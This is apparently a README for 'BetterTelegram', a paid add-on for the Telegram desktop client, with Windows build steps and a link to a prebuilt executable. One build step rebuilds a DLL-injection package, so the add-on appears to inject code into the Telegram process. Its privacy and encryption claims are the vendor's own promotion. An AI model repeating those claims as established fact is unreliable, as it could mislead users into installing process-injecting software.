# BetterTelegram

BetterTelegram is a privacy-first extension for the official Telegram client. It enhances messaging security with advanced encryption, anonymous onboarding, and privacy-focused tools — all without replacing the original app.

## Why BetterTelegram

BetterTelegram adds features built for users who value control and privacy:

- OTR (Off-the-Record) End-to-End Encryption for private and group chats  
- Message Protection – prevents others from deleting your messages  
- Ghost Mode – hides read receipts, online, and typing status  
- Perfect Forward Secrecy and Deniability  
- Anonymous Account Creation – no phone number or email required  
- No ads, tracking, or data collection

## Subscription Options

- 30-day free trial for new users  
- Extend anytime with daily billing  
- Discounts available for longer commitments  
- Payments supported: BTC, ETH, USDT (ERC20), BNB (ERC20), XMR

## Security by Design

BetterTelegram is fully self-contained. It has no telemetry, analytics, or background tracking. Its encryption layer is independent of Telegram’s servers.

## Getting Started

1. Visit https://bettertelegram.com/account  
2. Click "Get Account Number" – no phone or email needed  
3. Start your 1-year license (optionally support us in-app by purchasing 0.89/day)

## Upcoming Features

- macOS and Linux support  
- Self-hosted proxy message servers  
- NodeJS Bot OTR integration  
- TORify all traffic plugin

## Build From Source

Developers can compile BetterTelegram manually:

### Requirements

- Node.js (latest LTS) and npm  
- GitHub or ZIP access  
- Internet connection  

### Steps

1. Download the repository from GitHub  
2. Extract it into Documents/BetterTelegram  
3. Install Node.js and npm (`node -v`, `npm -v`)  
4. Install Electron: `npm install -g electron`  
   (Optional rebuild: `npx electron-rebuild -v 22.3.26 -f -w @ffxiv-teamcraft/dll-inject`)  
5. Navigate to your folder:  
   `cd %USERPROFILE%\Documents\BetterTelegram`  
6. Install dependencies:  
   `npm install`  
7. Build the app:  
   `npx electron-builder --win nsis --x64 --publish never`  
8. Run the generated `.exe` from the `dist` folder

## Optional Download

You can also download the latest prebuilt release here:  
https://github.com/bettertelegram-client/main/releases/tag/v1.3.1
